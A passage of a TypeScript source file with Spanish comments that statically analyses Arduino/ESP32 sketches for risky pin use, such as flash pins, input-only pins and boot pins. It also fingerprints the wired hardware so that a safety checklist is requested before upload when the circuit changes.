        } else {
          const v = valorHasta(codigo, pos)
          iniciales.set(nombre, v.valor)
          anotar(nombre, v.valor)
          pos = v.fin
        }
      } else if (codigo[pos] !== ",") break
      if (codigo[pos] !== ",") break
      pos++
    }
  }

  const reasignada = (nombre: string, arreglo: boolean): boolean => {
    const op = "(?:[-+*/%&|^]|<<|>>)?=(?!=)"
    const asign = arreglo ? new RegExp(`\\b${nombre}\\s*\\[[^\\]]*\\]\\s*${op}`, "g") : new RegExp(`\\b${nombre}\\s*${op}`, "g")
    const veces = [...codigo.matchAll(asign)].length
    const incrementos = new RegExp(`(?:\\+\\+|--)\\s*${nombre}\\b|\\b${nombre}\\s*(?:\\[[^\\]]*\\]\\s*)?(?:\\+\\+|--)`).test(codigo)
    // `&pin` o `int& r = pin`: se puede escribir por otro lado, ya no se sabe cuanto vale.
    const porReferencia = new RegExp(`(?<![&\\w])&\\s*${nombre}\\b|&\\s*[A-Za-z_]\\w*\\s*=\\s*${nombre}\\b`).test(codigo)
    // La declaracion misma (`int led = 13`, `int leds[3] = {...}`) matchea una vez: no cuenta.
    return veces > 1 || incrementos || porReferencia
  }

  const valores = new Map<string, string>()
  for (const [nombre, valor] of iniciales) {
    if (declaraciones.get(nombre) === 1 && !reasignada(nombre, false)) valores.set(nombre, valor)
  }
  const arreglos = new Map<string, string[]>()
  for (const [nombre, elems] of arreglosCrudos) {
    if (declaraciones.get(nombre) === 1 && !reasignada(nombre, true)) arreglos.set(nombre, elems)
  }
  return { defines: defs, valores, arreglos, textos }
}

const NO_SON_FUNCIONES = new Set(["if", "for", "while", "switch", "catch", "return", "sizeof", "else", "do"])

/**
 * Donde vive cada parametro: el cuerpo de la funcion que lo declara. Un
 * parametro que se llama igual que una global la tapa SOLO adentro de esa
 * funcion; afuera la global se sigue resolviendo.
 */
function ambitosDeParametros(codigo: string): Array<{ desde: number; hasta: number; params: Set<string> }> {
  const ambitos: Array<{ desde: number; hasta: number; params: Set<string> }> = []
  for (const m of codigo.matchAll(/\b([A-Za-z_]\w*)\s*\(([^()]*)\)\s*(?:const\s*)?\{/g)) {
    if (NO_SON_FUNCIONES.has(m[1]!)) continue
    const params = new Set(
      m[2]!
        .split(",")
        .map((p) => p.replace(/=.*$/, "").match(/([A-Za-z_]\w*)\s*(?:\[[^\]]*\]\s*)?$/)?.[1])
        .filter((x): x is string => !!x && x !== "void"),
    )
    if (params.size === 0) continue
    const abre = m.index! + m[0].length - 1
    let nivel = 0
    let hasta = codigo.length
    for (let i = abre; i < codigo.length; i++) {
      if (codigo[i] === "{") nivel++
      else if (codigo[i] === "}" && --nivel === 0) {
        hasta = i
        break
      }
    }
    ambitos.push({ desde: abre, hasta, params })
  }
  return ambitos
}

interface PinResuelto {
  pines: number[]
  /** Es el LED_BUILTIN del core: no cuenta como hardware conectado. */
  dePlaca: boolean
}

/** El numero (o los numeros, si es un arreglo recorrido) de una expresion de pin; null si no se sabe. */
function resolverPin(expr: string, s: Simbolos, familia: FamiliaPlaca | null, sombra: Set<string>, prof = 0): PinResuelto | null {
  if (prof > 8) return null
  let e = expr.trim()
  while (envueltoEnParentesis(e)) e = e.slice(1, -1).trim()
  e = e.replace(/^\((?:unsigned\s+)?(?:int|uint8_t|byte|gpio_num_t|pin_size_t)\)\s*/, "")
  const numero = e.match(/^(0x[0-9a-f]+|\d+)[ul]*$/i)
  if (numero) return { pines: [parseInt(numero[1]!, /^0x/i.test(numero[1]!) ? 16 : 10)], dePlaca: false }
  const gpio = e.match(/^GPIO_NUM_(\d+)$/)
  if (gpio) return { pines: [Number(gpio[1])], dePlaca: false }
  const analog = e.match(/^A(\d+)$/)
  if (analog) {
    const p = familia ? ANALOGICOS[familia][Number(analog[1])] : undefined
    return p === undefined ? null : { pines: [p], dePlaca: false }
  }
  const indice = e.match(/^([A-Za-z_]\w*)\s*\[(.*)\]$/)
  const elementos = (nombre: string, elegir: (xs: string[]) => string[]): PinResuelto | null => {
    const elems = sombra.has(nombre) ? undefined : s.arreglos.get(nombre)
    if (!elems) return null
    const partes = elegir(elems).map((x) => resolverPin(x, s, familia, sombra, prof + 1))
    if (partes.length === 0 || partes.some((p) => p === null)) return null
    return { pines: partes.flatMap((p) => p!.pines), dePlaca: partes.every((p) => p!.dePlaca) }
  }
  if (indice) {
    // Indice fijo: ese elemento. Indice variable (el `for` de siempre): todos.
    const idx = indice[2]!.trim()
    return elementos(indice[1]!, (xs) => (/^\d+$/.test(idx) ? [xs[Number(idx)]].filter((x): x is string => x !== undefined) : xs))
  }
  if (/^[A-Za-z_]\w*$/.test(e)) {
    if (sombra.has(e)) return null
    const def = s.defines.get(e) ?? s.valores.get(e)
    if (def !== undefined) return resolverPin(def, s, familia, sombra, prof + 1)
    if (e === "LED_BUILTIN") {
      const p = familia ? LED_BUILTIN_DEL_CORE[familia] : undefined
      return { pines: p === undefined ? [] : [p], dePlaca: true }
    }
    // Un arreglo nombrado entero (las filas de un Keypad): todos sus pines.
    return elementos(e, (xs) => xs)
  }
  return null
}

export type ModoPin =
  | "OUTPUT"
  | "INPUT"
  | "INPUT_PULLUP"
  | "INPUT_PULLDOWN"
  | "ANALOG"
  | "PWM"
  | "SERVO"
  | "DHT"
  | "LCD"
  | "PASO"
  | "NEOPIXEL"
  | "ONEWIRE"
  | "ULTRASONIDO"
  | "RFID"
  | "TECLADO"
  | "INFRARROJO"
  | "UART"
  | "?"

export interface UsoPin {
  expr: string
  pines: number[]
  dePlaca: boolean
  resuelto: boolean
  modo: ModoPin
  /** Viene de un `pinMode` (y no de un digitalWrite, analogRead, etc.). */
  declarado: boolean
  /** Esta en una rama de `#if` cuya condicion no se sabe: puede que ni se compile. */
  enIf: boolean
  /** "Serial1": los pines por defecto de Serial1 en el ESP32, que son de la flash. */
  origen?: "Serial1"
  /** Lo que se escribio para cada nombre de la expresion, si no se resolvio: va a la huella. */
  definiciones?: string
}

const MODOS_PINMODE = new Set(["OUTPUT", "INPUT", "INPUT_PULLUP", "INPUT_PULLDOWN"])

/*
 * LOS CONSTRUCTORES DE LIBRERIAS DE HARDWARE, con la posicion de cada pin. Sin
 * esto, `LiquidCrystal lcd(7, 8, ...)` en un ESP32 pasaba sin aviso: el pin
 * nunca aparece en un pinMode, lo maneja la libreria.
 */
const CONSTRUCTORES: Array<{ re: RegExp; pines: Array<[number, ModoPin]> | ModoPin }> = [
  { re: /\bLiquidCrystal\s+[A-Za-z_]\w*\s*\(/g, pines: "LCD" },
  { re: /\bStepper\s+[A-Za-z_]\w*\s*\(/g, pines: [[1, "PASO"], [2, "PASO"], [3, "PASO"], [4, "PASO"]] },
  { re: /\bAccelStepper\s+[A-Za-z_]\w*\s*\(/g, pines: [[1, "PASO"], [2, "PASO"], [3, "PASO"], [4, "PASO"]] },
  { re: /\bAdafruit_NeoPixel\s+[A-Za-z_]\w*\s*(?:=\s*Adafruit_NeoPixel\s*)?\(/g, pines: [[1, "NEOPIXEL"]] },
  { re: /\bDHT\s+[A-Za-z_]\w*\s*\(/g, pines: [[0, "DHT"]] },
  { re: /\bOneWire\s+[A-Za-z_]\w*\s*\(/g, pines: [[0, "ONEWIRE"]] },
  { re: /\b(?:NewPing|Ultrasonic)\s+[A-Za-z_]\w*\s*\(/g, pines: [[0, "ULTRASONIDO"], [1, "INPUT"]] },
  { re: /\bMFRC522\s+[A-Za-z_]\w*\s*\(/g, pines: [[0, "RFID"], [1, "RFID"]] },
  { re: /\bKeypad\s+[A-Za-z_]\w*\s*(?:=\s*Keypad\s*)?\(/g, pines: [[1, "TECLADO"], [2, "TECLADO"]] },
  { re: /\bIRrecv\s+[A-Za-z_]\w*\s*\(/g, pines: [[0, "INFRARROJO"]] },
]

// Las funciones de Arduino, NO los metodos de otro objeto: `mcp.pinMode(7, ...)`
// es un pin del expansor, no el GPIO7.
const NO_ES_METODO = "(?<!(?:\\.|->)\\s*)"
const LLAMADAS: Array<[RegExp, (a: string[]) => Array<[string, ModoPin, boolean]>]> = [
  [new RegExp(`${NO_ES_METODO}\\bpinMode\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], (MODOS_PINMODE.has(a[1] ?? "") ? a[1] : "?") as ModoPin, true]] : [])],
  [new RegExp(`${NO_ES_METODO}\\bdigitalWrite\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "OUTPUT", false]] : [])],
  [new RegExp(`${NO_ES_METODO}\\bdigitalRead\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "INPUT", false]] : [])],
  [new RegExp(`${NO_ES_METODO}\\banalogRead\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "ANALOG", false]] : [])],
  [new RegExp(`${NO_ES_METODO}\\banalogWrite\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "PWM", false]] : [])],
  [new RegExp(`${NO_ES_METODO}\\bledcAttach(?:Pin)?\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "PWM", false]] : [])],
  [new RegExp(`${NO_ES_METODO}\\btone\\s*\\(`, "g"), (a) => (a[0] ? [[a[0], "OUTPUT", false]] : [])],
]

interface Preparado {
  codigo: string
  /** Lineas con los textos, para leer los #include. */
  conTextos: string
  incierta: boolean[]
  cuerpoDeMacro: boolean[]
  s: Simbolos
}

export interface Archivo {
  nombre: string
  texto: string
}

/** Limpia y preprocesa cada archivo por su lado y los junta. */
function preparar(archivos: Archivo[], board: string): Preparado {
  const macros = macrosDePlaca(board)
  const lineas: string[] = []
  const lineasTexto: string[] = []
  const incierta: boolean[] = []
  const cuerpoDeMacro: boolean[] = []
  const defines = new Map<string, Definicion>()
  for (const a of archivos) {
    const p = preprocesar(limpiar(a.texto), macros)
    lineas.push(...p.lineas)
    lineasTexto.push(...p.lineasTexto)
    incierta.push(...p.incierta)
    cuerpoDeMacro.push(...p.cuerpoDeMacro)
    // Un mismo nombre con valores distintos en dos archivos: no se sabe cual vale.
    for (const [n, d] of p.defines) {
      const previa = defines.get(n)
      const todos = [...new Set([...(previa?.todos ?? []), ...d.todos])]
      defines.set(n, previa && previa.valor !== d.valor ? { ...d, ambigua: true, todos } : previa?.ambigua ? { ...previa, todos } : { ...d, todos })
    }
  }
  const codigo = lineas.join("\n")
  return { codigo, conTextos: lineasTexto.join("\n"), incierta, cuerpoDeMacro, s: juntarSimbolos(codigo, defines) }
}

/** Cada uso de un pin en el codigo ya preparado, resuelto o marcado como no resuelto. */
function usosDe(p: Preparado, familia: FamiliaPlaca | null): UsoPin[] {
  const { codigo, s } = p
  const ambitos = ambitosDeParametros(codigo)
  const inicioLinea: number[] = [0]
  for (let i = 0; i < codigo.length; i++) if (codigo[i] === "\n") inicioLinea.push(i + 1)
  const lineaDe = (idx: number) => {
    let lo = 0
    let hi = inicioLinea.length - 1
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1
      if (inicioLinea[mid]! <= idx) lo = mid
      else hi = mid - 1
    }
    return lo
  }

  const usos: UsoPin[] = []
  const agregar = (expr: string, modo: ModoPin, declarado: boolean, idx: number) => {
    const linea = lineaDe(idx)
    if (p.cuerpoDeMacro[linea]) return // `#define F(p) pinMode(p, ...)`: el p no es un pin todavia
    const sombra = new Set<string>()
    for (const a of ambitos) if (idx > a.desde && idx < a.hasta) for (const x of a.params) sombra.add(x)
    // `digitalWrite(ledPin, ...)` adentro de `parpadear(int ledPin)`: el pin real esta en la llamada, no aca.
    if (sombra.has(expr.trim())) return
    let r = resolverPin(expr, s, familia, sombra)
    // En UNO/Nano, `analogRead(0)` es A0, no D0.
    if (r && modo === "ANALOG" && familia === "uno") r = { ...r, pines: r.pines.map((x) => (x < 8 ? x + 14 : x)) }
    const limpio = expr.replace(/\s+/g, " ").trim()
    const definiciones = r
      ? undefined
      : [...new Set(limpio.match(/[A-Za-z_]\w*/g) ?? [])]
          .filter((n) => s.textos.has(n))
          .map((n) => `${n}=${s.textos.get(n)!.join("|")}`)
          .join(";") || undefined
    usos.push({
      expr: limpio,
      pines: r?.pines ?? [],
      dePlaca: r?.dePlaca ?? false,
      resuelto: r !== null,
      modo,
      declarado,
      enIf: p.incierta[linea] ?? false,
      ...(definiciones ? { definiciones } : {}),
    })
  }

  for (const [re, aUsos] of LLAMADAS) {
    for (const m of codigo.matchAll(re)) {
      const args = argumentosDesde(codigo, m.index! + m[0].length)
      for (const u of args ? aUsos(args) : []) agregar(u[0], u[1], u[2], m.index!)
    }
  }
  for (const c of CONSTRUCTORES) {
    for (const m of codigo.matchAll(c.re)) {
      const args = argumentosDesde(codigo, m.index! + m[0].length) ?? []
      const posiciones: Array<[number, ModoPin]> = typeof c.pines === "string" ? args.map((_, i) => [i, c.pines as ModoPin]) : c.pines
      for (const [i, modo] of posiciones) if (args[i]) agregar(args[i]!, modo, false, m.index!)
    }
  }
  // FastLED: el pin va en la plantilla, `FastLED.addLeds<WS2812, 5, GRB>(...)`.
  for (const m of codigo.matchAll(/\bFastLED\s*\.\s*addLeds\s*<\s*[^,<>]+,\s*([^,<>]+)/g)) agregar(m[1]!, "NEOPIXEL", false, m.index!)
  // Servo: `.attach(` solo sobre objetos declarados `Servo x` (Ticker tambien tiene attach).
  const servos = new Set<string>()
  for (const m of codigo.matchAll(/\bServo\s+([A-Za-z_][\w\s,[\]]*?);/g)) {
    for (const n of m[1]!.split(",")) {
      const nombre = n.trim().match(/^[A-Za-z_]\w*/)?.[0]
      if (nombre) servos.add(nombre)
    }
  }
  if (servos.size > 0) {
    const nombres = [...servos].join("|")
    for (const m of codigo.matchAll(new RegExp(`\\b(?:${nombres})\\s*(?:\\[[^\\]]*\\]\\s*)?\\.\\s*attach\\s*\\(`, "g"))) {
      const args = argumentosDesde(codigo, m.index! + m[0].length)
      if (args?.[0]) agregar(args[0], "SERVO", false, m.index!)
    }
  }
  // Serial1/Serial2 con pines: `Serial1.begin(9600, SERIAL_8N1, RX, TX)`.
  for (const m of codigo.matchAll(/(?<!\w)Serial([12])\s*\.\s*begin\s*\(/g)) {
    const args = argumentosDesde(codigo, m.index! + m[0].length) ?? []
    if (args.length >= 4) {
      for (const a of [args[2], args[3]]) if (a && a !== "-1") agregar(a, "UART", false, m.index!)
    } else if (m[1] === "1" && familia === "esp32") {
      /*
       * Serial1 SIN PINES en el ESP32 usa los de fabrica: RX1=GPIO9 y TX1=GPIO10
       * (core 2.0.17, `HardwareSerial.h`), que son de la flash. Lo verifico el
       * revisor de riesgo en el core fijado. Se registra como un uso propio para
       * que el aviso diga que es por Serial1 y no "GPIO9" a secas.
       */
      usos.push({ expr: "Serial1", pines: [9, 10], dePlaca: false, resuelto: true, modo: "UART", declarado: false, enIf: p.incierta[lineaDe(m.index!)] ?? false, origen: "Serial1" })
    }
  }
  return usos
}

const defaultDeFamilia = (familia: FamiliaPlaca | null) => (familia === "esp32" ? "esp32dev" : familia === "uno" ? "uno" : "?")

/** Cada uso de un pin en un codigo suelto (un solo archivo). */
export function usosDePines(src: string, familia: FamiliaPlaca | null, board = defaultDeFamilia(familia)): UsoPin[] {
  return usosDe(preparar([{ nombre: "main.cpp", texto: src }], board), familia)
}

export interface Hallazgo {
  nivel: "bloqueo" | "aviso" | "nota"
  texto: string
}

/** Como se llama el pin en la serigrafia de la placa. */
export function nombrePin(pin: number, familia: FamiliaPlaca | null): string {
  if (familia === "uno") return pin >= 14 && pin <= 21 ? `A${pin - 14}` : `D${pin}`
  return `GPIO${pin}`
}

const INCLUDE = /^\s*#\s*include\s*[<"]([^>"]+)[>"]/gm
const incluye = (p: Preparado, re: RegExp) => [...p.conTextos.matchAll(INCLUDE)].some((m) => re.test(m[1]!.trim()))
const usaWifi = (p: Preparado) => incluye(p, /^(WiFi|WiFiMulti|WebServer|HTTPClient|esp_now)\.h$/) || /\bWiFi\s*\./.test(p.codigo)
const usaSerial = (p: Preparado) => /\bSerial\s*\.\s*begin\s*\(/.test(p.codigo)
const usaServo = (p: Preparado) => incluye(p, /^(ESP32)?Servo\.h$/)

/** Las palabras de un identificador: `pinReleLuz` -> pin, rele, luz; `RELAY_1` -> relay. */
function palabras(id: string): string[] {
  return id
    .replace(/([a-zé])([A-Z])/g, "$1 $2")
    .split(/[^A-Za-zéÉ]+/)
    .filter(Boolean)
    .map((w) => w.toLowerCase())
}
const PALABRAS_RELE = new Set(["rele", "relé", "reles", "relés", "relay", "relays"])
/** El nombre dice relé. Por palabras, para que `release` o `irrelevante` no cuenten. INFERIDO: un relé no tiene libreria. */
const esRele = (texto: string) => (texto.match(/[A-Za-z_é]\w*/g) ?? []).some((id) => palabras(id).some((w) => PALABRAS_RELE.has(w)))

const SALIDA = new Set<ModoPin>(["OUTPUT", "PWM", "SERVO", "DHT", "LCD", "PASO", "NEOPIXEL", "ONEWIRE", "ULTRASONIDO", "RFID"])
const ENTRADA = new Set<ModoPin>(["INPUT", "INPUT_PULLUP", "INPUT_PULLDOWN", "ANALOG"])

/**
 * Las reglas de pines sobre lo ya preparado.
 *
 * NIVELES. "bloqueo" es solo la flash del ESP32 (GPIO6 a GPIO11, tambien via
 * Serial1 sin pines) fuera de una rama incierta: cargar eso deja la placa sin
 * arrancar, y es lo unico que frena `flash`/`both` sin vuelta. Lo demas son
 * avisos (34 a 39 como salida o con pull-up no ROMPEN nada: el pin no hace lo
 * que se espera, y una persona decidio que eso es un aviso, no un freno) y notas.
 */
function hallazgosDe(p: Preparado, usos: UsoPin[], familia: FamiliaPlaca | null): Hallazgo[] {
  if (!familia) return []
  const hallazgos: Hallazgo[] = []
  const vistos = new Set<string>()
  const agregar = (nivel: Hallazgo["nivel"], texto: string) => {
    if (vistos.has(texto)) return
    vistos.add(texto)
    hallazgos.push({ nivel, texto })
  }
  const wifi = usaWifi(p)
  const serial = usaSerial(p)
  const servo = usaServo(p)

  for (const u of usos.filter((x) => x.resuelto)) {
    if (u.origen === "Serial1") {
      const texto =
        "Serial1.begin sin pines usa GPIO9 y GPIO10, que en el ESP32 son de la memoria flash: la placa se cuelga. Hay que pasarle dos pines libres, por ejemplo Serial1.begin(9600, SERIAL_8N1, 25, 26)."
      if (u.enIf) agregar("aviso", `${texto} Está adentro de un #if, así que quizás no se compila.`)
      else agregar("bloqueo", texto)
      continue
    }
    for (const pin of u.pines) {
      const n = nombrePin(pin, familia)
      if (familia === "esp32") {
        if (PINES_FLASH.has(pin)) {
          if (u.enIf)
            agregar("aviso", `${n} es de la memoria flash del ESP32 (GPIO6 a GPIO11). Está adentro de un #if, así que quizás no se compila; si se compila, la placa no arranca.`)
          else
            agregar("bloqueo", `${n} está cableado a la memoria flash del ESP32 (GPIO6 a GPIO11): usarlo cuelga la placa o la deja sin arrancar. Hay que cambiarlo por otro pin (los más tranquilos: GPIO4, 5, 18, 19 o 23).`)
        } else if (PINES_SOLO_ENTRADA.has(pin) && SALIDA.has(u.modo)) {
          agregar("aviso", `${n} es SOLO ENTRADA en el ESP32 (34, 35, 36 y 39): no puede encender nada ni mandar señal. Lo que esté conectado ahí no va a andar.`)
        } else if (PINES_SOLO_ENTRADA.has(pin) && (u.modo === "INPUT_PULLUP" || u.modo === "INPUT_PULLDOWN")) {
          agregar("aviso", `${n} no tiene resistencia interna de pull-up ni pull-down (34, 35, 36 y 39): ${u.modo} no hace nada y el botón queda flotando. Hace falta una resistencia externa de 10 kΩ.`)
        } else if (PINES_NO_EXPUESTOS.has(pin)) {
          agregar("aviso", `${n} no sale en la placa ESP32 DevKit: no hay dónde conectarlo.`)
        }
        if (PINES_ADC2.has(pin) && u.modo === "ANALOG" && wifi) {
          agregar("aviso", `${n} es del ADC2 y el código usa WiFi: con el WiFi prendido, analogRead ahí falla o da cualquier cosa. Para leer un sensor analógico con WiFi va un pin del ADC1: GPIO32, 33, 34, 35, 36 o 39.`)
        }
        if (pin === 12 || pin === 0) {
          agregar("aviso", `Cuidado con ${n}: es un pin de arranque del ESP32. Si lo que está conectado lo deja en el nivel equivocado al encender, la placa no arranca o no se deja cargar.`)
        } else if ((pin === 15 || pin === 2) && ENTRADA.has(u.modo)) {
          agregar("nota", `Nota: ${n} es un pin de arranque del ESP32; como entrada anda, pero si lo que está conectado lo fuerza al encender, la carga puede fallar.`)
        }
        if (PINES_UART_USB.has(pin)) {
          agregar("aviso", `${n} es ${pin === 1 ? "TX" : "RX"} del USB de la placa: con algo conectado ahí, la carga puede fallar y el monitor serie muestra basura.`)
        }
      } else {
        if ((pin === 0 || pin === 1) && u.modo !== "ANALOG" && serial) {
          agregar("aviso", `${n} es ${pin === 1 ? "TX" : "RX"} del USB y el código usa Serial: los dos se pisan. Con algo conectado ahí la carga puede fallar y el monitor serie muestra basura.`)
        }
        if (u.modo === "PWM" && !UNO_PWM.has(pin)) {
          agregar("aviso", `${n} no hace PWM en el UNO/Nano: analogWrite ahí solo prende o apaga, sin valores intermedios. Los que hacen PWM son D3, D5, D6, D9, D10 y D11, los marcados con ~.`)
        }
        // INFERIDO: la libreria Servo del core AVR toma el Timer1, que es el del PWM de D9 y D10.
        if (u.modo === "PWM" && (pin === 9 || pin === 10) && servo) {
          agregar("aviso", `${n} pierde el PWM cuando se usa la librería Servo, que ocupa el mismo temporizador que D9 y D10: analogWrite ahí no va a regular.`)
        }
      }
    }
  }
  const orden = { bloqueo: 0, aviso: 1, nota: 2 }
  return hallazgos.sort((a, b) => orden[a.nivel] - orden[b.nivel])
}

/** Las reglas de pines sobre un codigo suelto. */
export function analizarPines(src: string, familia: FamiliaPlaca | null, board = defaultDeFamilia(familia)): Hallazgo[] {
  const p = preparar([{ nombre: "main.cpp", texto: src }], board)
  return hallazgosDe(p, usosDe(p, familia), familia)
}

/*
 * LA HUELLA DEL HARDWARE, y por que el checklist depende de ella.
 *
 * El checklist de seguridad se pide antes de cargar, pero pedirlo en CADA carga
 * lo vuelve un tramite que se saltea: el docente corrige un delay y le preguntan
 * otra vez si el relé esta desenchufado. Por eso se pide cuando el CIRCUITO
 * cambio, no cuando cambio el codigo.
 *
 * La huella es lo que dice el codigo del circuito: la placa, cada pin con su
 * modo, y las librerias de hardware de una lista blanca. NO entra el LED de la
 * placa, ni la logica, ni el WiFi: no hay nada que conectar. Un pin que no se
 * resolvio entra con su nombre Y con lo que tiene escrito (`MOTOR=4`): asi
 * cambiar el #define de 4 a 25 cambia la huella aunque no se sepa el numero.
 *
 * El freno se levanta con un codigo de 6 caracteres que sale de la huella: el
 * tool se lo da al bot junto con la instruccion de hacer el checklist. NO es una
 * cerradura (el bot tiene el codigo): es un PASO OBLIGADO, una vuelta extra con
 * la instruccion escrita. Si sirve o hace falta preguntarle al docente directo
 * (`ctx.ask`) se decide con las mediciones de MED-2. Un codigo viejo no sirve
 * para un circuito nuevo.
 */
const LIBRERIAS_HARDWARE: Record<string, string> = {
  "DHT.h": "DHT",
  "DHT_U.h": "DHT",
  "Servo.h": "Servo",
  "ESP32Servo.h": "Servo",
  "LiquidCrystal.h": "LCD",
  "LiquidCrystal_I2C.h": "LCD I2C",
  "Adafruit_NeoPixel.h": "NeoPixel",
  "FastLED.h": "NeoPixel",
  "OneWire.h": "OneWire",
  "DallasTemperature.h": "DS18B20",
  "Stepper.h": "Paso a paso",
  "AccelStepper.h": "Paso a paso",
  "MFRC522.h": "RFID",
  "Adafruit_SSD1306.h": "OLED",
  "U8g2lib.h": "OLED",
  "NewPing.h": "Ultrasonido",
  "Ultrasonic.h": "Ultrasonido",
  "IRremote.h": "Infrarrojo",
  "IRremote.hpp": "Infrarrojo",
  "Adafruit_BMP280.h": "BMP280",
  "Adafruit_BME280.h": "BME280",
  "Adafruit_MPU6050.h": "MPU6050",
  "MPU6050.h": "MPU6050",
  "HX711.h": "HX711",
  "Keypad.h": "Teclado",
}

export interface Huella {
  placa: string
  entradas: string[]
}

export interface Rasgos {
  wifi: boolean
  dht: boolean
  servo: boolean
  rele: boolean
}

function huellaDe(p: Preparado, usos: UsoPin[], board: string, familia: FamiliaPlaca | null): { huella: Huella; rasgos: Rasgos } {
  const sinCore = usos.filter((u) => !u.dePlaca)
  // Si el pin tiene pinMode, manda el pinMode; si no, como se lo usa.
  const porPin = new Map<string, UsoPin[]>()
  for (const u of sinCore) {
    const claves = u.resuelto ? u.pines.map(String) : [u.definiciones ? `${u.expr}{${u.definiciones}}` : u.expr]
    for (const clave of claves) porPin.set(clave, [...(porPin.get(clave) ?? []), u])
  }
  /*
   * EL LED DE LA PLACA no pide checklist, escrito como sea que lo escriban los
   * blinks: `ejemplos/blink-uno` hace `pinMode(13, OUTPUT)` y `ejemplos/blink-esp32`
   * `PIN_LED = 2`. Pero solo si el pin es el del LED Y se lo nombra como LED (un
   * numero, LED_BUILTIN o un nombre con "led"): `LAMPARA = 13` es otra cosa y
   * pide checklist, igual que un relé en ese pin. Con una placa fuera del
   * catalogo no sabemos el pin, asi que alcanza con el nombre.
   */
  const exentoLed = (u: UsoPin, clave: string) => {
    if (u.modo !== "OUTPUT" || esRele(u.expr)) return false
    const nombreLed = u.expr === "LED_BUILTIN" || /led/i.test(u.expr)
    return familia ? clave === String(LED_PLACA[familia]) && (/^\d+$/.test(u.expr) || nombreLed) : nombreLed
  }
  const entradas = new Set<string>()
  for (const [clave, us] of porPin) {
    const declarados = us.filter((u) => u.declarado)
    for (const u of declarados.length > 0 ? declarados : us) {
      if (!exentoLed(u, clave)) entradas.add(`pin:${clave}:${u.modo}`)
    }
  }
  const libs = new Set<string>()
  for (const m of p.conTextos.matchAll(INCLUDE)) {
    const lib = LIBRERIAS_HARDWARE[m[1]!.trim()]
    if (lib) libs.add(lib)
  }
  for (const l of libs) entradas.add(`lib:${l}`)
  const nombres = [...p.s.textos.keys()]
  const rele = sinCore.some((u) => esRele(u.expr)) || nombres.some((n) => esRele(n))
  return {
    huella: { placa: board, entradas: [...entradas].sort() },
    rasgos: { wifi: usaWifi(p), dht: libs.has("DHT"), servo: libs.has("Servo"), rele },
  }
}

/** La huella del hardware que dice un codigo suelto, y los rasgos que deciden que skills recordar. */
export function huellaDelCodigo(src: string, board: string): { huella: Huella; rasgos: Rasgos } {
  const familia = familiaDePlaca(board)
  const p = preparar([{ nombre: "main.cpp", texto: src }], board)
  return huellaDe(p, usosDe(p, familia), board, familia)
}

/** El codigo de 6 hex que levanta el freno del checklist para ESTA huella. */
export function codigoChecklist(h: Huella): string {
  return createHash("sha256").update(`${h.placa}\n${h.entradas.join("\n")}`).digest("hex").slice(0, 6)
}

/** Lo que entra nuevo respecto de la ultima carga. Con otra placa (o sin carga previa), todo es nuevo. */
export function altasNuevas(actual: Huella, previa: Huella | null): string[] {
  if (!previa || previa.placa !== actual.placa) return actual.entradas
  const antes = new Set(previa.entradas)
  return actual.entradas.filter((e) => !antes.has(e))
}

const huellaCambio = (actual: Huella, previa: Huella | null) =>
  previa ? previa.placa !== actual.placa || previa.entradas.join("\n") !== actual.entradas.join("\n") : actual.entradas.length > 0

const MODO_LEGIBLE: Record<ModoPin, string> = {
  OUTPUT: "como salida",
  INPUT: "como entrada",
  INPUT_PULLUP: "como entrada con pull-up",
  INPUT_PULLDOWN: "como entrada con pull-down",
  ANALOG: "como entrada analógica",
  PWM: "con PWM",
  SERVO: "con un servo",
  DHT: "con un DHT",
  LCD: "con un LCD",
  PASO: "con un motor paso a paso",
  NEOPIXEL: "con LEDs NeoPixel",
  ONEWIRE: "con un sensor OneWire",
  ULTRASONIDO: "con un ultrasónico",
  RFID: "con un lector RFID",
  TECLADO: "con un teclado",
  INFRARROJO: "con un receptor infrarrojo",
  UART: "como puerto serie",
  "?": "",
}

/** `pin:4:OUTPUT` -> "GPIO4 como salida"; `lib:DHT` -> "librería DHT". */
export function describirEntrada(e: string, familia: FamiliaPlaca | null): string {
  if (e === HUELLA_INCOMPLETA.entradas[0]) return "el código que no pude leer"
  if (e.startsWith("lib:")) return `librería ${e.slice(4)}`
  const m = e.match(/^pin:(.+):([A-Z_?]+)$/)
  if (!m) return e
  const pin = /^\d+$/.test(m[1]!) ? nombrePin(Number(m[1]), familia) : m[1]!.replace(/\{.*\}$/, "")
  return `${pin} ${MODO_LEGIBLE[m[2] as ModoPin] ?? ""}`.trim()
}

/** Los skills que conviene tener cargados para lo que el codigo usa. Los nombres son carpetas de opencode/skills. */
export function skillsParaRasgos(r: Rasgos): string[] {
  const skills: string[] = []
  if (r.wifi) skills.push("esp32")
  if (r.dht) skills.push("sensores", "librerias")
  if (r.servo) skills.push("actuadores", "librerias")
  if (r.rele) skills.push("actuadores", "checklist-seguridad")
  return [...new Set(skills)]
}

// ── 4. El proyecto en disco ─────────────────────────────────────────────────

/** Las secciones del platformio.ini, con sus claves. Las lineas con sangria continuan el valor anterior. */
export function leerIni(iniText: string): Map<string, Map<string, string>> {
  const secciones = new Map<string, Map<string, string>>()
  let actual: Map<string, string> | null = null
  let ultima = ""
  for (const cruda of iniText.split(/\r?\n/)) {
    const sinComentario = cruda.replace(/(^|\s)[;#].*$/, "")
    if (!sinComentario.trim()) continue
    const cab = sinComentario.trim().match(/^\[([^\]]+)\]$/)
    if (cab) {
      actual = new Map()
      secciones.set((cab[1] ?? "").trim(), actual)
      ultima = ""
      continue
    }
    if (!actual) continue
    if (/^\s/.test(sinComentario) && ultima) {
      actual.set(ultima, `${actual.get(ultima) ?? ""}\n${sinComentario.trim()}`)
      continue
    }
    const kv = sinComentario.match(/^\s*([\w.-]+)\s*=\s*(.*)$/)
    if (kv) {
      ultima = kv[1]!
      actual.set(ultima, kv[2]!.trim())
    }
  }
  return secciones
}

/**
 * Las placas que se van a cargar. Si se pidio un environment, ese. Si no, los
 * `default_envs` de `[platformio]`; si no hay, TODOS los `[env:x]` (eso es lo que
 * hace `pio run` sin `-e`). Cada env toma su `board` o, si no tiene, el de `[env]`.
 */
export function placasElegidas(iniText: string, env?: string): string[] {
  const ini = leerIni(iniText)
  const comun = ini.get("env")
